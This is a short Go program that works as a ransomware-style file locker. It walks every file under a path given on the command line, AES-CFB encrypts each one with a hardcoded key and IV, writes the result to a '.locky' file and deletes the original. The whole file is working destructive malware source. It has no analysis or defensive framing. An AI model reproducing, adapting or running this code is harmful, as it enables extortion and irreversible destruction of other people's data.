package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

var bytes = []byte{35, 46, 57, 24, 85, 35, 24, 74, 87, 35, 88, 98, 66, 32, 14, 05}

func run(fp string) ([]string, error) {
	searchDir := fp

	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		if f.IsDir() != true {
			fmt.Println("encrypting -> " + path)
			ef, _ := os.Create(strings.Split(path, ".")[0] + ".locky")
			ep, _ := EncryptFile(path, "abc&1*~#^2^#s0^=)^^7jb34")
			ef.Write(ep)
			os.Remove(path)
			fileList = append(fileList, path)
		}

		return err
	})

	if e != nil {
		panic(e)
	}

	// for _, file := range fileList {
	// 	fmt.Println(file)
	// }

	return fileList, nil
}

func EncryptFile(fp string, MySecret string) ([]byte, error) {
	block, err := aes.NewCipher([]byte(MySecret))
	if err != nil {
		fmt.Println(err)
		return []byte(""), err
	}
	file, _ := os.ReadFile(fp)
	cfb := cipher.NewCFBEncrypter(block, bytes)
	cipherFile := make([]byte, len(file))
	cfb.XORKeyStream(cipherFile, file)
	return cipherFile, nil
}

func main() {
	if len(os.Args[:]) < 2 {
		fmt.Println(os.Args[0] + " <path>")
		return
	}
	run(os.Args[1])
}
